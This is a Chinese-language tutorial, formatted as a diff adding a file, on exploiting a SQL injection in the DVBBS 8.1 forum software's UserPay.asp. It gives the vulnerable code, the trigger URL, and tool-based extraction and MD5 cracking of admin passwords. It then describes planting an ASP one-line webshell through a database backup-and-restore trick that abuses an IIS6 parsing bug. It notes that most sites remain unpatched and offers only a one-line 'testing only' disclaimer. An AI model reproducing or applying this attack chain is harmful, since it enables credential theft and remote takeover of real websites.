@@ -1,0 +1,80 @@
+动网8.1注入0Day漏洞详解
+
+[动网8.1注入0Day漏洞详解 全文]
+影响版本：动网8.1
+官方网站：http://www.dvbbs.net
+漏洞类型：SQL注入
+漏洞描述：
+此漏洞可以直接导致任意注册用户拿到Admin用户账号及密码。
+这个漏洞出现在动网论坛根目录的UserPay.asp文件中，注册用户任意购买一个东西，生成一个订单号即可构建存在注入漏洞的页面。下面我们来重点分析代码，找到导致漏洞的原因，以下是UserPay.asp中的漏洞代码。
+ 
+If Request("raction")="alipay_return" Then
+AliPay_Return()
+Dvbbs.Footer()
+Response.End
+ElseIf Request("action")="alipay_return" Then
+AliPay_Return()
+Dvbbs.Footer()
+Response.End
+''ElseIf Request("action")="Re_inmoney" Then
+''Re_inmoney()
+''Dvbbs.Footer()
+''Response.End
+End If
+
+有语言基础的朋友可以看出来，这里“raction”和“action”的判断条件都是“alipay_return”，且执行内容是相同的，都是调用了AliPay_Return()函数。我们继续搜索aliPay_return()函数的内容，在行329到行351，找到了该函数的代码。
+Sub AliPay_Return()
+If Dvbbs.Forum_ChanSetting(5) <> "0" Then
+AliPay_Return_Old()
+Exit sub
+Else
+Dim Rs,Order_No,EnCodeStr,UserInMoney
+Order_No=Request("out_trade_no")
+Set Rs = Dvbbs.Execute("Select * From [Dv_ChanOrders] Where O_IsSuc=3 And O_PayCode=''"&Order_No&"''")
+If not(Rs.Eof And Rs.Bof) Then
+AliPay_Return_Old()
+Exit sub
+End if
+Response.Clear
+Set Rs = Dvbbs.Execute("Select * From [Dv_ChanOrders] Where O_IsSuc=0 And O_PayCode=''"&Order_No&"''")
+If Rs.Eof And Rs.Bof Then
+Response.Write "N"
+Else
+Response.Write "Y"
+Dvbbs.Execute("Update Dv_ChanOrders Set O_IsSuc=3 Where O_ID = " & Rs("O_ID"))
+End If
+Response.End
+End If
+End Sub
+
+
+这里的条件判断中，“If Dvbbs.Forum_ChanSetting(5) <> "0"”这一句，意思就是如果Dvbbs.Forum_ChanSetting(5)不等于0，则执行。“<>”相当于C里的“!=”，不等于的意思。接下来，我们打开数据库，看看它默认的值是多少。
+1,1,0,0,pay@aspsky.net,0,b63uvb8nsvsmbsaxszgvdr6svyus0l4t,1,1,1,1,1,1,1,100,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
+Forum_ChanSetting(5)缺省为0，接下来我们看看下面的代码。
+Order_No=Request("out_trade_no")
+Set Rs = Dvbbs.Execute("Select * From [Dv_ChanOrders] Where O_IsSuc=3 And O_PayCode=''"&Order_No&"''")
+你会发现，程序直接接受获取的“Order_No”数据，没有经过任何处理！正如文章开头我们说的，此漏洞在Dvbbs 8.0中并不存在。8.0中AliPay_Return()函数的代码如下：
+Sub AliPay_Return()
+If Dvbbs.Forum_ChanSetting(5) <> "0" Then
+AliPay_Return_Old()
+Else
+Response.Clear
+Dim Rs,Order_No,EnCodeStr,UserInMoney
+Order_No = Dvbbs.CheckStr(Request("order_no"))
+Set Rs = Dvbbs.Execute("Select * From Dv_ChanOrders Where O_IsSuc=0 And O_PayCode = ''"&Order_No&"''")
+If Rs.Eof And Rs.Bof Then
+Response.Write "N"
+
+
+大家可以注意到“Order_No = Dvbbs.CheckStr(Request("order_no"))”这一句，这里的CheckStr()正是动网的检查非法字符函数，通过这个函数，检查、过滤非法字符，来达到防注入的目的。而到了DVBBS8.1中，却没有了这一句！（难道说DVBBS8.1为了提高速度，连检查字符串都去掉了!?）通过分析代码，我们构造这样的语句就可以触发漏洞：“http://IPaddress/userpay.asp?raction=alipay_return&out_trade_no=XXX”（XXX为你的订单号）。至此，漏洞代码及原理分析完了，下面我们开始进行实测。
+用于测试的是本地局域网内的一台服务器，IP为192.168.0.101，端口8080。我们首先注册修改admin密码前台、后台均为920430（为了破解MD5方便，位数少些）。接着注册一个用户，然后依次点击“控制面板->购买论坛点券”，再点击“网上支付”按钮，如图1所示，之后出现的页面会报错，当然不是IIS的错，而是支付接口的错误，如图2所示。将其关闭，返回网站，点击“所有交易记录”，会看到有一个项目，还有一个订单号.
+
+下面我们来构造URL：http://www.sitedirsec.com:8080/userpay.asp?raction=alipay_return&out_trade_no=2008011317201363527b64cea5f，提交后先是返回一个字母Y，直接刷新页面后，返回如图4所示的错误，然后我们加个单引号，如图5所示。出错了，好，我们开始注入。
+ 
+
+经过我的测试，推荐大家使用NBSI进行测试，因为我用明小子和HDSI都无法正常猜解（也可能是我这里的原因）。使用时，第一遍扫描不到漏洞，然后加上特征字符“非法”再检测就可以了。表名、列名如果猜解不出来，可以自己添加。表名为dv_admin和dv_user（前者是后台管理者账号、密码，后者是前台，有的记录会很多，只要前10个就够了，因为都是最早注册的，是管理员的几率很大。）列名为username、password、id三项，之后进行猜解，并对MD5密码破解验证，如图6所示。
+ 
+
+拿下后台之后，就该上传WebShell了。下面我来简单介绍一下DVBBS 8.1如何上传WebShell，还是利用假数据库。先登录后台，修改上传限制大小（通常这样一个库都要大于默认的100K）。本地构造一个数据库name.mdb，并在数据库中创建表“name”，在表中建立字段“name”，类型为文本型（名字大家可以自定义），属性为默认。在字段“name”中输入“<<%execute(request("name"))%>>”，保存退出，并修改后缀为txt，之后在论坛上传name.txt（这里是不会显示上传文件地址的），然后发布主题（一定要发布）。完成后我们登录后台，点击“文件管理->上传文件管理”，找到文件地址，如“../UploadFile/2008-1/200811319153335452.txt”，先备份数据库，默认即可。然后打开恢复数据库（注意，一定要提前备份数据库，下一步要覆盖数据，否则网站就报废了），填写刚才的地址，到备份数据库点击备份，目录写成name.asa，最后再把刚才备份的数据恢复回去即可。这样，我们的小马地址就是http://ipaddress/name.asa/name.mdb了（IIS6有个Bug，就是会把文件夹带asp后缀和asa后缀的里面的文件按照ASP解析执行）。
+本文完成时，动网官方已经发布了紧急漏洞修补补丁（后台的上方消息栏会有提示），不过国内多数网站仍然没有修补此漏洞（大约有90%）。此漏洞影响严重，有使用DVBBS8.1的站长抓紧时间修补。同时提醒广大读者，此漏洞危害严重，仅做测试使用，不要做非法用途！
+
